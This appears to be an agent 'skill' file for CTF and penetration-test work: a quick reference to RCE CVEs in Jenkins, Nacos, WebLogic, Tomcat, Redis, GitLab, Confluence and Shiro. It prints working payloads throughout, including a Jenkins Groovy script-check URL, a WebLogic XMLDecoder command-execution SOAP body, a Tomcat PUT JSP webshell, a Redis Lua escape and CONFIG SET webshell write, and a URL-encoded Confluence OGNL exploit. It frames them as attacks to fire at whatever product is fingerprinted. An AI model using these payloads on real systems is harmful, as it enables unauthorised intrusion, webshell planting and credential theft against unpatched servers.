name: middleware-cve
description: High-frequency middleware/product CVE quick-reference — Jenkins, Nacos, WebLogic, Tomcat, Redis, GitLab, Confluence, Shiro. Each entry: fingerprint, the one CVE that gives instant RCE, and its trigger. Use when the target runs a known middleware and generic web methodology stalls — "know the CVE = instant solve".
---

# Middleware CVE Quick-Reference

Authorized CTF/assessment use. Named middleware boxes are "known CVE" challenges: fingerprint the product+version, apply the canonical RCE CVE, verify. Don't re-derive. (Full CVE libraries exist per-product; these are the highest-hit, most reliable ones.)

## 1. Jenkins — unauth Groovy RCE

**Fingerprint:** `X-Jenkins` response header; `/jenkins`, `/script`, `/manage`.

**CVE-2018-1000861 (≤2.153 / LTS ≤2.138.3):** unauth RCE via the dynamic-routing + Groovy metaprogramming flaw:
```
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true&value=public class x { public x(){ "id".execute().text.eachLine{println it} } }
```
Also try `/script` console if you have admin, and the classic `CVE-2017-1000353` (CLI deserialization).

## 2. Nacos — auth bypass + deserialization

**Fingerprint:** `/nacos/`, title "Nacos", `console-fe` assets.

**CVE-2021-29441 (auth bypass):** the `User-Agent: Nacos-Server` header bypasses auth on config endpoints → read `application.properties` (DB creds) or create a user.
```
GET /nacos/v1/auth/users?pageNo=1&pageSize=9   (with User-Agent: Nacos-Server)
```
**Nacos deser RCE:** the `derby`/`config` deserialization chain (NACOS-DESER-RCE) for older versions.

## 3. WebLogic — T3/XMLDecoder/JNDI RCE

**Fingerprint:** port 7001/7002, `/console`, `T3` protocol banner, "Oracle WebLogic".

**CVE-2017-10271 (XMLDecoder, ≤10.3.6.0):**
```
POST /wls-wsat/CoordinatorPortType
<soapenv:Envelope ...><soapenv:Body>
<java><void class="java.lang.ProcessBuilder"><array class="java.lang.String"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></void></java>
```
**CVE-2023-21839 (JNDI, 12.2.1.3/14.1.1.0):** `t3://` JNDI lookup → RCE. Also CVE-2018-2894 (upload), CVE-2020-14882 (console auth bypass).

## 4. Tomcat — PUT upload / AJP

**Fingerprint:** `Server: Apache-Coyote`, port 8080/8009, `/manager`.

**CVE-2017-12615 (PUT webshell, 7.0.0-7.0.81):**
```
PUT /shell.jsp/ HTTP/1.1      (trailing slash / %20 / ::$DATA bypass)
body: <%@ page import="java.util.*,java.io.*"%><% if(request.getParameter("c")!=null){Process p=Runtime.getRuntime().exec(request.getParameter("c"));...}%>
```
**Ghostcat (CVE-2020-1938, AJP 8009):** read `/WEB-INF/web.xml` and any class/config without auth.

## 5. Redis — Lua escape / unauth write

**Fingerprint:** port 6379, `redis-cli INFO` without auth.

**CVE-2022-0543 (Lua sandbox escape, Debian ≤5.x):**
```
EVAL 'return {os.execute("id")}' 0     (os and package globals available → RCE)
```
**Unauth write → RCE:** `CONFIG SET dir /var/www/html` + `dbfilename shell.php` + `SET x "<?php ...?>"` + `SAVE` (see unauthorized-access skill).

## 6. GitLab — ExifTool RCE

**Fingerprint:** `/users/sign_in`, `GitLab` title, version in `/help` / response headers.

**CVE-2021-22205 (ExifTool, ≤13.10.2):** unauth RCE via a crafted image upload:
```
upload a .jpg with DjVu ANTa payload (gitlab exiftool RCE) → runs arbitrary command
```

## 7. Confluence — OGNL injection

**Fingerprint:** `/login.action`, title "Confluence", `atlassian` cookies.

**CVE-2022-26134 (OGNL, ≤7.18.1/7.4.17 etc.):**
```
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
```
Also CVE-2019-3396 (path traversal), CVE-2021-26084 (OGNL).

## 8. Shiro — rememberMe deserialization

**Fingerprint:** `Set-Cookie: rememberMe=deleteMe;`.

**CVE-2016-4437:** the rememberMe cookie is AES-encrypted serialized data with a hardcoded/default key — ysoserial gadget → AES with the key → RCE (see web-framework-cve skill for the full chain). CVE-2020-11989 / CVE-2020-13933 are the auth-bypass/request-context variants.

## Cross-cutting
- **Fingerprint the product/version** (header, title, port banner) — the CVE choice depends on it.
- **One canonical CVE per product** — try the highest-hit RCE first, then the alternates.
- Self-verify with `id`/a callback before reading the flag.
